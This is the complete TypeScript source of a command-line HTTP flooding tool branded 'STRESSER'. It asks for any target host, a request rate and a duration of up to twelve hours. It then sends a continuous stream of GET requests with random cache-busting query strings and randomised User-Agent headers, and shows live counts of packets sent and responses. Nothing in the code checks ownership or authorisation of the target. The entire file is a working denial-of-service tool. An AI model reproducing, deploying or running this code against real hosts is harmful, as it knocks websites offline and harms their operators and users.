import Dayjs from 'dayjs';
import DayjsDuration from 'dayjs/plugin/duration';
Dayjs.extend(DayjsDuration);
import RandomUA from 'random-useragent';
import Kindof from 'kind-of';
import Readline from 'readline';

import Package from '../package.json';

const rl = Readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const intervals = new Map<string, NodeJS.Timeout>();

const print = () => {
  console.clear();

  console.log('\n');
  console.log('    \x1b[90m #####   ######   #####    #####    #####    #####', '\x1b[0m');
  console.log('    \x1b[90m##         ##     ##  ##   ##      ##       ##', '\x1b[0m');
  console.log('    \x1b[90m ####      ##     #####    ####     ####     ####', '\x1b[0m');
  console.log('    \x1b[90m    ##     ##     ##  ##   ##          ##       ##', '\x1b[0m');
  console.log('    \x1b[90m#####      ##     ##  ##   #####   #####    #####', '\x1b[0m');
  console.log('');
  console.log(`                                                   \x1b[37mv${Package.version}`, '\x1b[0m');
  console.log('');
};

const question = (query: string): Promise<string> =>
  new Promise((resolve) => {
    rl.question(query, resolve);
  });

const run = async () => {
  print();

  const target_question = await question('Target: ');

  print();

  const target = target_question
    .toLowerCase()
    .trim()
    .replace(/^https?:\/\//, '')
    .split('/')[0];

  if (!target) {
    console.log('Field target cannot be left blank.');

    setTimeout(() => void run(), 2500);

    return;
  }

  // eslint-disable-next-line @typescript-eslint/no-unnecessary-condition
  if (Kindof(target) !== 'string') {
    console.log('Field target must be a string.');

    setTimeout(() => void run(), 2500);

    return;
  }

  console.log(`Target: ${target}`);

  const throttling_question = await question('Throttling: ');

  print();

  if (!throttling_question) {
    console.log('Field throttling cannot be left blank.');

    setTimeout(() => void run(), 2500);

    return;
  }

  if (isNaN(Number(throttling_question))) {
    console.log('Field throttling must be a number.');

    setTimeout(() => void run(), 2500);

    return;
  }

  const throttling = Math.max(1, Math.min(Number(throttling_question), 100));

  console.log(`Target: ${target}`);
  console.log(`Throttling: ${throttling.toString()}`);

  const duration_question = await question('Duration (s): ');

  print();

  if (!duration_question) {
    console.log('Field duration cannot be left blank.');

    setTimeout(() => void run(), 2500);

    return;
  }

  if (isNaN(Number(duration_question))) {
    console.log('Field duration must be a number.');

    setTimeout(() => void run(), 2500);

    return;
  }

  const duration = Math.max(1, Math.min(Number(duration_question), 43200));

  console.log(`Target: ${target}`);
  console.log(`Throttling: ${throttling.toString()}`);
  console.log(`Duration (s): ${duration.toString()}`);

  console.log('');
  console.log('Status                          \x1b[33mPreparing... ⟳', '\x1b[0m');
  console.log('Packets Sent                    \x1b[90m--', '\x1b[0m');
  console.log('Successful Resp.                \x1b[90m--', '\x1b[0m');
  console.log('Unsuccessful Resp.              \x1b[90m--', '\x1b[0m');
  console.log('Remaining Time                  \x1b[90m--', '\x1b[0m');
  console.log('');

  await Bun.sleep(1000);

  print();

  console.log(`Target: ${target}`);
  console.log(`Throttling: ${throttling.toString()}`);
  console.log(`Duration (s): ${duration.toString()}`);

  console.log('');
  console.log('Status                          \x1b[33mAlmost Ready... ⟳', '\x1b[0m');
  console.log('Packets Sent                    \x1b[90m--', '\x1b[0m');
  console.log('Successful Resp.                \x1b[90m--', '\x1b[0m');
  console.log('Unsuccessful Resp.              \x1b[90m--', '\x1b[0m');
  console.log('Remaining Time                  \x1b[90m--', '\x1b[0m');

  console.log('');

  await Bun.sleep(2500);

  let running = true;
  let packets_sent = 0;
  let successful_responses = 0;
  let unsuccessful_responses = 0;
  let remaining_time = duration;

  intervals.set("STRESSING", setInterval(() => {
    for (let i = 0; i < throttling; i++) {
      packets_sent++;

      fetch(`http://${target}?${Math.random().toString()}=${Math.random().toString()}`, {
        method: 'GET',
        headers: {
          'User-Agent': RandomUA.getRandom()
        }
      })
        .then((response) => {
          if ((response.status >= 200 && response.status < 300) || (response.status >= 400 && response.status < 500)) {
            successful_responses++;
          } else unsuccessful_responses++;
        })
        .catch(() => unsuccessful_responses++);
    }
  }));

  let previous_packets_sent = 0;
  let previous_successful_responses = 0;
  let previous_unsuccessful_responses = 0;
  let previous_remaining_time = 0;

  setInterval(() => {
    print();

    console.log(`Target: ${target}`);
    console.log(`Throttling: ${throttling.toString()}`);
    console.log(`Duration (s): ${duration.toString()}`);

    console.log('');
    console.log(`Status                          ${running ? '\x1b[37mRunning ▶' : '\x1b[31mStopped ■'}`, '\x1b[0m');
    console.log(`Packets Sent                    ${previous_packets_sent !== packets_sent ? '\x1b[34m' : '\x1b[90m'}${packets_sent.toString()} ↑`, '\x1b[0m');
    console.log(`Successful Resp.                ${previous_successful_responses !== successful_responses ? '\x1b[32m' : '\x1b[90m'}${successful_responses.toString()} ↓`, '\x1b[0m');
    console.log(`Unsuccessful Resp.              ${previous_unsuccessful_responses !== unsuccessful_responses ? '\x1b[31m' : '\x1b[90m'}${unsuccessful_responses.toString()} ⇣`, '\x1b[0m');
    console.log(`Remaining Time                  ${previous_remaining_time !== remaining_time ? '\x1b[33m' : '\x1b[90m'}${Dayjs.duration(remaining_time, 'seconds').format('HH:mm:ss')} ⏱︎`, '\x1b[0m');

    console.log('');

    previous_packets_sent = packets_sent;
    previous_successful_responses = successful_responses;
    previous_unsuccessful_responses = unsuccessful_responses;
    previous_remaining_time = remaining_time;
  }, 1000);

  setInterval(() => {
    if (remaining_time === 0) {
      running = false;

      clearInterval(intervals.get("STRESSING"));
      intervals.delete("STRESSING")
    } else remaining_time--;
  }, 1000);
};

void run();
